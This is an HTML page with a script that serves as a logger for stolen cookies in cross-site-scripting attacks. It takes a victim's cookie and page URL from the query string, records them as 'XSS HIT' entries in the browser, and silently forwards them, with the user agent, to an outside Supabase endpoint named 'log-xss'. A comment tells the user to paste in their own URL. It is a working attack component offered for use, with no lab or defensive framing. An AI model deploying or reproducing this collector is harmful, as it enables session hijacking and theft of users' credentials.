<script>
    const logsDiv = document.getElementById('logs');
    const BACKEND_URL = 'https://viwictbgpkifzlwltcpw.supabase.co/functions/v1/log-xss';  // ← PASTE YOUR URL HERE

    function loadLogs() {
        const savedLogs = localStorage.getItem('xssLogs') || '=== Previous Logs ===\n\n';
        logsDiv.innerHTML = savedLogs;
    }

    function addLog() {
        const params = new URLSearchParams(window.location.search);
        const cookie = params.get('c') || 'no_cookie';
        const url = params.get('u') || 'no_url';
        const time = new Date().toISOString();
        const userAgent = navigator.userAgent;

        const newLog = `=== XSS HIT ===\nTime: ${time}\nCookie: ${cookie}\nURL: ${url}\nUser-Agent: ${userAgent}\n========================\n\n`;

        // Show in browser (local view)
        logsDiv.innerHTML += newLog;
        localStorage.setItem('xssLogs', logsDiv.innerHTML);

        // === SEND TO SUPABASE (global logging) ===
        const sendParams = new URLSearchParams({
            c: cookie,
            u: url,
            ua: userAgent
        });

        fetch(BACKEND_URL + '?' + sendParams.toString(), {
            method: 'GET',
            mode: 'no-cors'
        }).catch(() => {});   // silent fail is fine

        console.log(newLog);
    }

    loadLogs();
    if (window.location.search) {
        addLog();
    }
</script>
